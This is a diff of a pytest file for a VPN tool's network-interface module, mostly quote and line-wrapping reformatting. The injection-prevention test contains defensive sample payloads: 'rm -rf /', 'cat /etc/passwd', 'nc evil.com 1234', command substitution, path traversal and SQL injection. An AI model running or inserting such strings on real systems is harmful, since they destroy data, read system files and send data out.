@@ -14,13 +14,8 @@ class TestNetworkInterfaceValidation:
 
     def test_valid_interface_name_accepted(self, mocker, valid_interface_names):
         """Test that valid interface names are accepted."""
-        mock_cmd = mocker.patch('vpnhd.system.commands.execute_command')
-        mock_cmd.return_value = mocker.Mock(
-            success=True,
-            exit_code=0,
-            stdout="",
-            stderr=""
-        )
+        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
+        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")
 
         for interface in valid_interface_names:
             ni = NetworkInterface(interface)
@@ -67,13 +62,8 @@ class TestBringInterfaceUp:
 
     def test_bring_up_success(self, mocker):
         """Test successfully bringing interface up."""
-        mock_cmd = mocker.patch('vpnhd.system.commands.execute_command')
-        mock_cmd.return_value = mocker.Mock(
-            success=True,
-            exit_code=0,
-            stdout="",
-            stderr=""
-        )
+        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
+        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")
 
         ni = NetworkInterface("eth0")
         result = ni.bring_interface_up()
@@ -88,13 +78,8 @@ class TestBringInterfaceUp:
 
     def test_bring_up_failure(self, mocker):
         """Test failure when bringing interface up."""
-        mock_cmd = mocker.patch('vpnhd.system.commands.execute_command')
-        mock_cmd.return_value = mocker.Mock(
-            success=False,
-            exit_code=1,
-            stdout="",
-            stderr="error"
-        )
+        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
+        mock_cmd.return_value = mocker.Mock(success=False, exit_code=1, stdout="", stderr="error")
 
         ni = NetworkInterface("eth0")
         result = ni.bring_interface_up()
@@ -103,7 +88,7 @@ class TestBringInterfaceUp:
 
     def test_bring_up_uses_array_command(self, mocker):
         """Test that bring_up uses array-based command (secure)."""
-        mock_cmd = mocker.patch('vpnhd.system.commands.execute_command')
+        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
         mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")
 
         ni = NetworkInterface("wg0")
@@ -119,13 +104,8 @@ class TestBringInterfaceDown:
 
     def test_bring_down_success(self, mocker):
         """Test successfully bringing interface down."""
-        mock_cmd = mocker.patch('vpnhd.system.commands.execute_command')
-        mock_cmd.return_value = mocker.Mock(
-            success=True,
-            exit_code=0,
-            stdout="",
-            stderr=""
-        )
+        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
+        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")
 
         ni = NetworkInterface("eth0")
         result = ni.bring_interface_down()
@@ -134,7 +114,7 @@ class TestBringInterfaceDown:
 
     def test_bring_down_uses_array_command(self, mocker):
         """Test that bring_down uses array-based command (secure)."""
-        mock_cmd = mocker.patch('vpnhd.system.commands.execute_command')
+        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
         mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")
 
         ni = NetworkInterface("wg0")
@@ -150,7 +130,7 @@ class TestSetIPAddress:
 
     def test_set_ip_valid_ipv4(self, mocker, valid_ip_addresses):
         """Test setting valid IPv4 addresses."""
-        mock_cmd = mocker.patch('vpnhd.system.commands.execute_command')
+        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
         mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")
 
         ni = NetworkInterface("eth0")
@@ -171,7 +151,7 @@ class TestSetIPAddress:
 
     def test_set_ip_valid_netmask(self, mocker, valid_netmasks):
         """Test setting IP with valid netmasks."""
-        mock_cmd = mocker.patch('vpnhd.system.commands.execute_command')
+        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
         mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")
 
         ni = NetworkInterface("eth0")
@@ -194,7 +174,7 @@ class TestSetIPAddress:
 
     def test_set_ip_uses_array_command(self, mocker):
         """Test that set_ip_address uses array-based command."""
-        mock_cmd = mocker.patch('vpnhd.system.commands.execute_command')
+        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
         mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")
 
         ni = NetworkInterface("eth0")
@@ -224,7 +204,7 @@ class TestAddRoute:
 
     def test_add_route_success(self, mocker):
         """Test adding route successfully."""
-        mock_cmd = mocker.patch('vpnhd.system.commands.execute_command')
+        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
         mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")
 
         ni = NetworkInterface("eth0")
@@ -248,7 +228,7 @@ class TestAddRoute:
 
     def test_add_route_uses_array_command(self, mocker):
         """Test that add_route uses array-based command."""
-        mock_cmd = mocker.patch('vpnhd.system.commands.execute_command')
+        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
         mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")
 
         ni = NetworkInterface("eth0")
@@ -276,7 +256,7 @@ class TestDeleteRoute:
 
     def test_delete_route_success(self, mocker):
         """Test deleting route successfully."""
-        mock_cmd = mocker.patch('vpnhd.system.commands.execute_command')
+        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
         mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")
 
         ni = NetworkInterface("eth0")
@@ -293,7 +273,7 @@ class TestDeleteRoute:
 
     def test_delete_route_uses_array_command(self, mocker):
         """Test that delete_route uses array-based command."""
-        mock_cmd = mocker.patch('vpnhd.system.commands.execute_command')
+        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
         mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")
 
         ni = NetworkInterface("eth0")
@@ -309,7 +289,7 @@ class TestFlushInterface:
 
     def test_flush_success(self, mocker):
         """Test flushing interface successfully."""
-        mock_cmd = mocker.patch('vpnhd.system.commands.execute_command')
+        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
         mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")
 
         ni = NetworkInterface("eth0")
@@ -319,7 +299,7 @@ class TestFlushInterface:
 
     def test_flush_uses_array_command(self, mocker):
         """Test that flush uses array-based command."""
-        mock_cmd = mocker.patch('vpnhd.system.commands.execute_command')
+        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
         mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")
 
         ni = NetworkInterface("eth0")
@@ -335,12 +315,9 @@ class TestGetInterfaceStats:
 
     def test_get_stats_success(self, mocker):
         """Test getting interface stats successfully."""
-        mock_cmd = mocker.patch('vpnhd.system.commands.execute_command')
+        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
         mock_cmd.return_value = mocker.Mock(
-            success=True,
-            exit_code=0,
-            stdout="RX bytes: 1000 TX bytes: 2000",
-            stderr=""
+            success=True, exit_code=0, stdout="RX bytes: 1000 TX bytes: 2000", stderr=""
         )
 
         ni = NetworkInterface("eth0")
@@ -350,7 +327,7 @@ class TestGetInterfaceStats:
 
     def test_get_stats_uses_array_command(self, mocker):
         """Test that get_stats uses array-based command."""
-        mock_cmd = mocker.patch('vpnhd.system.commands.execute_command')
+        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
         mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="stats", stderr="")
 
         ni = NetworkInterface("eth0")
@@ -367,7 +344,7 @@ class TestEnableIPForwarding:
     def test_enable_ipv4_forwarding(self, mocker):
         """Test enabling IPv4 forwarding."""
         # Mock FileManager methods
-        mock_file_manager = mocker.patch('vpnhd.network.interfaces.FileManager')
+        mock_file_manager = mocker.patch("vpnhd.network.interfaces.FileManager")
         mock_instance = mocker.Mock()
         mock_file_manager.return_value = mock_instance
         mock_instance.write_file.return_value = True
@@ -382,7 +359,7 @@ class TestEnableIPForwarding:
 
     def test_enable_ipv6_forwarding(self, mocker):
         """Test enabling IPv6 forwarding."""
-        mock_file_manager = mocker.patch('vpnhd.network.interfaces.FileManager')
+        mock_file_manager = mocker.patch("vpnhd.network.interfaces.FileManager")
         mock_instance = mocker.Mock()
         mock_file_manager.return_value = mock_instance
         mock_instance.write_file.return_value = True
@@ -397,13 +374,13 @@ class TestEnableIPForwarding:
 
     def test_enable_forwarding_no_shell_pipes(self, mocker):
         """Test that IP forwarding doesn't use shell pipes (security fix)."""
-        mock_file_manager = mocker.patch('vpnhd.network.interfaces.FileManager')
+        mock_file_manager = mocker.patch("vpnhd.network.interfaces.FileManager")
         mock_instance = mocker.Mock()
         mock_file_manager.return_value = mock_instance
         mock_instance.write_file.return_value = True
 
         # Mock execute_command to ensure it's not used with pipes
-        mock_cmd = mocker.patch('vpnhd.system.commands.execute_command')
+        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
 
         ni = NetworkInterface("eth0")
         ni.enable_ip_forwarding()
@@ -425,12 +402,9 @@ class TestInterfaceExists:
 
     def test_interface_exists_true(self, mocker):
         """Test checking for existing interface."""
-        mock_cmd = mocker.patch('vpnhd.system.commands.execute_command')
+        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
         mock_cmd.return_value = mocker.Mock(
-            success=True,
-            exit_code=0,
-            stdout="eth0: <BROADCAST,MULTICAST,UP>",
-            stderr=""
+            success=True, exit_code=0, stdout="eth0: <BROADCAST,MULTICAST,UP>", stderr=""
         )
 
         ni = NetworkInterface("eth0")
@@ -440,12 +414,9 @@ class TestInterfaceExists:
 
     def test_interface_exists_false(self, mocker):
         """Test checking for non-existent interface."""
-        mock_cmd = mocker.patch('vpnhd.system.commands.execute_command')
+        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
         mock_cmd.return_value = mocker.Mock(
-            success=False,
-            exit_code=1,
-            stdout="",
-            stderr="does not exist"
+            success=False, exit_code=1, stdout="", stderr="does not exist"
         )
 
         ni = NetworkInterface("eth0")
@@ -459,12 +430,9 @@ class TestGetIPAddress:
 
     def test_get_ip_success(self, mocker):
         """Test getting IP address successfully."""
-        mock_cmd = mocker.patch('vpnhd.system.commands.execute_command')
+        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
         mock_cmd.return_value = mocker.Mock(
-            success=True,
-            exit_code=0,
-            stdout="inet 192.168.1.100/24",
-            stderr=""
+            success=True, exit_code=0, stdout="inet 192.168.1.100/24", stderr=""
         )
 
         ni = NetworkInterface("eth0")
@@ -475,12 +443,9 @@ class TestGetIPAddress:
 
     def test_get_ip_no_address(self, mocker):
         """Test getting IP when none assigned."""
-        mock_cmd = mocker.patch('vpnhd.system.commands.execute_command')
+        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
         mock_cmd.return_value = mocker.Mock(
-            success=True,
-            exit_code=0,
-            stdout="no address",
-            stderr=""
+            success=True, exit_code=0, stdout="no address", stderr=""
         )
 
         ni = NetworkInterface("eth0")
@@ -492,15 +457,18 @@ class TestGetIPAddress:
 class TestCommandInjectionPrevention:
     """Comprehensive injection prevention tests for NetworkInterface."""
 
-    @pytest.mark.parametrize("malicious_interface", [
-        "eth0; rm -rf /",
-        "eth0 && cat /etc/passwd",
-        "eth0|nc evil.com 1234",
-        "eth0`whoami`",
-        "eth0$(id)",
-        "../../../etc/passwd",
-        "'; DROP TABLE interfaces; --",
-    ])
+    @pytest.mark.parametrize(
+        "malicious_interface",
+        [
+            "eth0; rm -rf /",
+            "eth0 && cat /etc/passwd",
+            "eth0|nc evil.com 1234",
+            "eth0`whoami`",
+            "eth0$(id)",
+            "../../../etc/passwd",
+            "'; DROP TABLE interfaces; --",
+        ],
+    )
     def test_all_methods_reject_malicious_interface(self, malicious_interface):
         """Test that malicious interface names are rejected by all methods."""
         with pytest.raises(ValidationError):
@@ -534,7 +502,7 @@ class TestCommandInjectionPrevention:
 
     def test_no_f_strings_in_commands(self, mocker):
         """Test that no f-strings are used in command execution."""
-        mock_cmd = mocker.patch('vpnhd.system.commands.execute_command')
+        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
         mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")
 
         ni = NetworkInterface("eth0")
@@ -558,7 +526,7 @@ class TestEdgeCases:
 
     def test_interface_name_max_length(self, mocker):
         """Test interface name at maximum length (15 characters)."""
-        mock_cmd = mocker.patch('vpnhd.system.commands.execute_command')
+        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
         mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")
 
         # Exactly 15 characters (IFNAMSIZ limit)
@@ -573,7 +541,7 @@ class TestEdgeCases:
 
     def test_special_characters_in_valid_interface(self, mocker):
         """Test valid special characters in interface names."""
-        mock_cmd = mocker.patch('vpnhd.system.commands.execute_command')
+        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
         mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")
 
         valid_interfaces = ["eth0", "eth-0", "eth_0", "eth.0"]
@@ -594,7 +562,7 @@ class TestEdgeCases:
 
     def test_ip_address_edge_cases(self, mocker):
         """Test IP address edge cases."""
-        mock_cmd = mocker.patch('vpnhd.system.commands.execute_command')
+        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
         mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")
 
         ni = NetworkInterface("eth0")
@@ -609,7 +577,7 @@ class TestEdgeCases:
 
     def test_netmask_cidr_range(self, mocker):
         """Test netmask CIDR range validation."""
-        mock_cmd = mocker.patch('vpnhd.system.commands.execute_command')
+        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
         mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")
 
         ni = NetworkInterface("eth0")
